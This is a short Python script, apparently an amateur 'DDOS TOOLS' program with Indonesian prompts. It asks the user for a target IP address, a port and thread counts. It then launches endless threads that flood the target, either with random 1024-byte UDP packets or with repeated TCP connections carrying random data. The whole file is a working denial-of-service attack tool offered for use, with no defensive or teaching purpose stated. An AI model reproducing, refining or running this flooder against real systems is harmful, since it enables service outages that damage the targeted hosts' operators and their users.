#!/usr/bin/env python3
#Code by Dendi
import random
import socket
import threading

print("-- DDOS TOOLS BY : Devilz Samp --")
ip = str(input(" MEBERI UANG KEPADA IP:"))
port = int(input(" SANTET PORT:"))
choice = str(input(" SIAP? (Y/N):"))
times = int(input(" SANTET perkoneksi:"))
threads = int(input(" Jumlah JUMLAH SANTET:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MENTAL DOWN!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MENTAL DOWN!!!")
		except:
			s.close()
			print("[*] Error")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()